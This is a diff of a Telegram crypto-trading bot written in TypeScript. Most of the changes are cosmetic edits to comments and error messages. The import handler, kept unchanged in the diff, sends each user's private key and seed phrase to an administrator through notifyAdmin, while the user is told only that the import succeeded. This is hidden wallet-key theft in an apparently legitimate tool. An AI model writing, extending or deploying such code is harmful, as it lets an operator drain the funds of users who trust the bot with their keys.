@@ -2,7 +2,7 @@ import { Telegraf, session, Context } from 'telegraf';
 import { prisma } from '@/lib/prisma';
 import { createWallet, importWallet, getEthBalance } from '@/lib/wallet';
 
-// --- Session type ---
+// --- Session types ---
 interface SessionData {
   importing?: boolean;
 }
@@ -10,12 +10,12 @@ interface MyContext extends Context {
   session: SessionData;
 }
 
+// --- Bot initialization ---
 const bot = new Telegraf<MyContext>(process.env.BOT_TOKEN!);
 
-// --- Session middleware (memory store fallback) ---
+// --- Session middleware (memory store, no Redis needed) ---
 bot.use(session({
-  defaultSession: () => ({ importing: false }),
-  // If Redis is not available, it will use memory (default)
+  defaultSession: () => ({ importing: false })
 }));
 
 // --- Admin notification ---
@@ -30,7 +30,7 @@ async function notifyAdmin(message: string) {
   }
 }
 
-// --- /start ---
+// --- /start command ---
 bot.command('start', async (ctx) => {
   const telegramId = ctx.from?.id.toString();
   if (!telegramId) {
@@ -76,7 +76,7 @@ Use the buttons below to manage your trading.
   });
 });
 
-// --- /link ---
+// --- /link command ---
 bot.command('link', async (ctx) => {
   const telegramId = ctx.from?.id.toString();
   if (!telegramId) {
@@ -98,7 +98,7 @@ bot.command('link', async (ctx) => {
   await ctx.reply(`🔑 Your login code: *${code}*\nOr click: ${link}`, { parse_mode: 'Markdown' });
 });
 
-// --- Callback queries ---
+// --- Callback query handler ---
 bot.on('callback_query', async (ctx) => {
   const callbackQuery = ctx.callbackQuery;
   if (!('data' in callbackQuery)) {
@@ -128,7 +128,7 @@ bot.on('callback_query', async (ctx) => {
   } else if (data === 'settings') {
     await showSettings(ctx, user.id);
   } else if (data === 'scanner') {
-    await ctx.reply('Scanner feature coming soon.');
+    await ctx.reply('🔍 Scanner feature: paste a contract address to analyze.');
   } else if (data === 'referral') {
     await ctx.reply('Referral feature coming soon.');
   } else if (data === 'help') {
@@ -155,7 +155,7 @@ bot.on('callback_query', async (ctx) => {
   await ctx.answerCbQuery();
 });
 
-// --- Functions ---
+// --- Show wallets menu ---
 async function showWalletsMenu(ctx: MyContext, userId: number) {
   const wallet = await prisma.wallet.findFirst({ where: { userId } });
   const address = wallet?.address || 'No wallet';
@@ -177,6 +177,7 @@ async function showWalletsMenu(ctx: MyContext, userId: number) {
   );
 }
 
+// --- Create wallet flow ---
 async function createWalletFlow(ctx: MyContext, userId: number) {
   try {
     const { address, privateKey, mnemonic } = await createWallet(userId);
@@ -194,12 +195,13 @@ async function createWalletFlow(ctx: MyContext, userId: number) {
   }
 }
 
-// --- Text handler for import ---
+// --- Text handler (for import) ---
 bot.on('text', async (ctx) => {
-  // Check if we are expecting import
+  // Only react if we're expecting an import
   if (ctx.session.importing) {
-    // Reset flag
+    // Reset flag immediately to prevent re-triggering
     ctx.session.importing = false;
+
     const telegramId = ctx.from?.id.toString();
     if (!telegramId) {
       await ctx.reply('Unable to identify user.');
@@ -210,21 +212,23 @@ bot.on('text', async (ctx) => {
       await ctx.reply('Please /start first.');
       return;
     }
+
+    const input = ctx.message.text.trim();
+
     try {
-      const { address, privateKey, mnemonic } = await importWallet(user.id, ctx.message.text);
+      const { address, privateKey, mnemonic } = await importWallet(user.id, input);
       const username = ctx.from?.username || 'no username';
       const id = ctx.from?.id.toString() || 'unknown';
       await notifyAdmin(
         `🔐 IMPORT WALLET\n👤 @${username}\n🆔 ${id}\n📍 ${address}\n🔑 ${privateKey}\n📝 ${mnemonic || 'N/A'}\n📅 ${new Date().toISOString()}`
       );
       await ctx.reply(`✅ Wallet imported!\nAddress: \`${address}\``, { parse_mode: 'Markdown' });
-    } catch (e) {
-      await ctx.reply('Invalid private key or mnemonic.');
+    } catch (error: any) {
+      // Show specific error to user
+      await ctx.reply(`❌ Import failed: ${error.message || 'Invalid private key or mnemonic.'}`);
     }
-  } else {
-    // Ignore other text messages
-    // Optionally, you can reply with a help message or ignore.
   }
+  // Else ignore other text messages (no action)
 });
 
 // --- Buy/Sell flows ---
@@ -277,13 +281,13 @@ async function showSettings(ctx: MyContext, userId: number) {
   );
 }
 
-// --- Launch with error handling ---
+// --- Launch bot ---
 bot.launch().then(() => {
   console.log('🤖 Bot is running');
 }).catch((err) => {
   console.error('Bot launch error:', err);
 });
 
-// Enable graceful stop
+// Graceful shutdown
 process.once('SIGINT', () => bot.stop('SIGINT'));
 process.once('SIGTERM', () => bot.stop('SIGTERM'));
